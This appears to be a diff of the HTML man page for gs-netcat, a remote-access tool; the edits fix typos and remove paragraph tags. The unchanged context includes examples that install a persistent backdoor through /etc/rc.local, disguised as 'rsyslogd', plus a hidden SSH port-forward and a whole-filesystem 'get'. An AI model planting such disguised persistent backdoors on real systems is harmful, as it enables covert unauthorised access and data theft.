@@ -148,7 +148,6 @@ Generate a secure random password and output it to standard output.
 
 <DD>
 Interactive login shell. The server spawns a true PTY login shell. The client acts as a true PTY client (with Ctrl-C etc working). The client can terminate the session by typing 'Ctrl-e q' at any time or by typing 'exit'. The server supports multiple clients at the same time.
-<P>
 <DT><B>-k </B><I>file</I>
 
 
@@ -167,7 +166,7 @@ Server/Listening mode. The default mode is client.
 
 
 <DD>
-Log file [defaut: standard out]
+Log file [default: standard out]
 <DT><B>-p </B><I>port</I>
 
 
@@ -223,7 +222,6 @@ Client to wait for the listening server to become available.
 </DL>
 <P>
 
-<P>
 <A NAME="lbAF">&nbsp;</A>
 <H2>CONSOLE</H2>
 
@@ -250,14 +248,11 @@ File transfer logs
 </UL><P>
 
 Type 'help' for a list of available commands.
-<P>
 <A NAME="lbAG">&nbsp;</A>
 <H2>FILETRANSFER</H2>
 
-File transfer is available from the command console. Files are transfered with the permission and modification timestamp unchanged. Partially transfered files are re-started where the transfer was left off.
-<P>
+File transfer is available from the command console. Files are transferred with the permission and modification timestamp unchanged. Partially transferred files are re-started where the transfer was left off.
 The 'put' command is used for uploading:
-<P>
 
 <BLOCKQUOTE><TT>put foobar.txt</TT></BLOCKQUOTE>
 
@@ -266,34 +261,24 @@ The 'put' command is used for uploading:
 <BLOCKQUOTE><TT>put /tmp/*.log</TT></BLOCKQUOTE>
 
 <BLOCKQUOTE><TT>put $(find . -type f -name '*.c')</TT></BLOCKQUOTE>
-<P>
 (The above example shows Shell Variable substitution and word expansion)
-<P>
 It is possible to limit the amount of path information that is sent as implied directories for each path you specify. You can insert a dot and a slash into the source path, like this:
-<P>
 
 <BLOCKQUOTE><TT>put /foo/./bar/baz.c</TT></BLOCKQUOTE>
-<P>
 That would create /tmp/bar/baz.c on the remote machine. 
-<P>
 The 'get' command is used for downloading:
-<P>
 
 <BLOCKQUOTE><TT>get foobar.txt</TT></BLOCKQUOTE>
 
 <BLOCKQUOTE><TT>get $(find /var/./ -name '*.log')</TT></BLOCKQUOTE>
-<P>
-Transfering a directory automatically transfers all files and directories within that directory (recursively):
-<P>
+Transferring a directory automatically transfers all files and directories within that directory (recursively):
 
 <BLOCKQUOTE><TT>get /var/log</TT></BLOCKQUOTE>
 
 <BLOCKQUOTE><TT>get</TT></BLOCKQUOTE>
  
 The first command transfers all directories and files in /var/log/*. The latter command transfers the entire filesystem.
-<P>
 Multiple get/put commands can be scheduled at the same time.
-<P>
 <A NAME="lbAH">&nbsp;</A>
 <H2>EXAMPLES</H2>
 
@@ -402,7 +387,7 @@ The following line in /etc/rc.local starts the backdoor after each system reboot
 <BLOCKQUOTE><TT>GSOCKET_ARGS=&quot;-s MySecret -liqD&quot; HOME=/root TERM=xterm-256color SHELL=&quot;/bin/bash&quot; /bin/bash -c&nbsp;&quot;cd $HOME; exec -a rsyslogd /usr/local/bin/gs-netcat&quot;</TT></BLOCKQUOTE>
 <P>
 
-The follwing line in /etc/rc.local starts a port-forward to 127.0.0.1:22:
+The following line in /etc/rc.local starts a port-forward to 127.0.0.1:22:
 
 <BLOCKQUOTE><TT>GSOCKET_ARGS=&quot;-k MySecret2 -lqD -d 127.1 -p22&quot;  /bin/bash -c&nbsp;&quot;exec -a rsyslogd /usr/local/bin/gs-netcat&quot;</TT></BLOCKQUOTE>
 <P>
@@ -418,8 +403,6 @@ The '(...)' brackets start a sub-shell which is then replaced (by exec) with the
 Client to connect to the backdoor:
 
 <BLOCKQUOTE><TT>$ gs-netcat -s MySecret -i</TT></BLOCKQUOTE>
-<P>
-<P>
 <A NAME="lbAI">&nbsp;</A>
 <H2>ENVIRONMENT</H2>
 
@@ -445,7 +428,6 @@ The following environment variables can be set to control the behavior of
 
 
 <BLOCKQUOTE><TT>A string containing additional command line parameters. First the normal command line parameters are processed and then the command line parameters from GSOCKET_ARGS.</TT></BLOCKQUOTE>
-<P>
 <A NAME="lbAJ">&nbsp;</A>
 <H2>SECURITY</H2>
 
@@ -495,12 +477,10 @@ Assume Alice shares the same password with Bob and Malice. When Alice stops list
 <B>7.</B>
 
 SRP has Perfect Forward Secrecy. This means that past sessions can not be decrypted even if the password becomes known.
-<P>
 <A NAME="lbAK">&nbsp;</A>
 <H2>NOTES</H2>
 
 The latest version is available from <A HREF="https://github.com/hackerschoice/gsocket/.">https://github.com/hackerschoice/gsocket/.</A>
-<P>
 <A NAME="lbAL">&nbsp;</A>
 <H2>SEE ALSO</H2>
 
@@ -522,7 +502,6 @@ The latest version is available from <A HREF="https://github.com/hackerschoice/g
 <A HREF="https://hackerschoice.github.io/socat.1.html">socat</A>(1)
 
 
-<P>
 <A NAME="lbAM">&nbsp;</A>
 <H2>BUGS</H2>
 
@@ -553,6 +532,6 @@ Efforts have been made to have
 This document was created by
 <A HREF="http://hackerschoice.github.io/">man2html</A>,
 using the manual pages.<BR>
-Time: 14:27:29 GMT, March 31, 2021
+Time: 17:54:49 GMT, April 07, 2021
 </BODY>
 </HTML>
